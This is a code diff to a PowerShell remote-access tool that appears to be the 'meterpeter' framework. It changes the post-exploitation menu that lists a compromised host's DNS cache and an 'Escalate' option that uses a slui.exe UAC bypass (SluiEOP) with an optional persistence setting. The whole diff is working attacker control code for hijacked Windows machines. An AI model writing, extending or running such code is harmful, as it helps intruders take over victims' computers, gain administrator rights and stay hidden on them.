@@ -699,7 +699,8 @@ While($Client.Connected)
       If($choise -eq "ListDNS" -or $choise -eq "dns")
       {
         write-host " List of Remote-Host DNS Entrys." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-        $Command = "cmd /R ipconfig /displaydns > dns.txt;Get-Content dns.txt;remove-item dns.txt -Force";
+        # $Command = "cmd /R ipconfig /displaydns > dns.txt;Get-Content dns.txt;remove-item dns.txt -Force";
+        $Command = "cmd /R ipconfig /displaydns | findstr /C:`"Record Name`" /C:`"A (Host) Record`" > dns.txt;Get-Content dns.txt;remove-item dns.txt -Force";
       }
       If($choise -eq "ListConn" -or $choise -eq "conn")
       {
@@ -910,7 +911,7 @@ While($Client.Connected)
       write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
-      If($choise -eq "Escalate" -or $choice -eq "escal")
+      If($choise -eq "Escalate" -or $choice -eq "escalate")
       {
         write-host "`n   Getsystem Requirements" -ForegroundColor Yellow;
         write-host "   ----------------------";
@@ -952,7 +953,8 @@ While($Client.Connected)
               If($PersisteMe -eq "True"){
                  write-host "`n   If 'MakeItPersistence' its activated (True) then SluiEOP will NOT";
                  write-host "   Delete the EOP, making the 'command' available everytime we execute";
-                 write-host "   powershell Start-Process `"C:\Windows\System32\slui.exe`" -verb runas`n"
+                 write-host "   powershell Start-Process `"C:\Windows\System32\slui.exe`" -verb runas"
+                 write-host "   Remark: .\SluiEOP.ps1 `"deleteEOP`" argument deletes the persistence" -ForeGroundColor yellow;
               }
 
               If(-not($mYcOMMAND) -or $mYcOMMAND -eq $null){$mYcOMMAND = "$env:WINDIR\System32\cmd.exe"}
@@ -2039,13 +2041,14 @@ While($Client.Connected)
           }ElseIf($SluiEOP -eq "True"){
           
             cd mimiRatz
+            ## Revert SluiEOP [<MakeItPersistence>] to defalt [<False>]
             $CheckValue = Get-Content SluiEOP.ps1|Select-String "MakeItPersistence ="
             If($CheckValue -match 'True'){((Get-Content -Path SluiEOP.ps1 -Raw) -Replace "MakeItPersistence = `"True`"","MakeItPersistence = `"False`"")|Set-Content -Path SluiEOP.ps1 -Force}
             cd ..
 
-            Write-Host "`n   Privs   Status   Description" -ForeGroundColor green;
-            Write-Host "   -----   ------   -----------";
-            Write-Host "   user    saved    $OutPut"
+            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
+            write-host "   ------   -----------"
+            Write-Host "   Saved    $OutPut"
             $SluiEOP = "False"
           }else{
             $OutPut = $OutPut -replace "`n","";
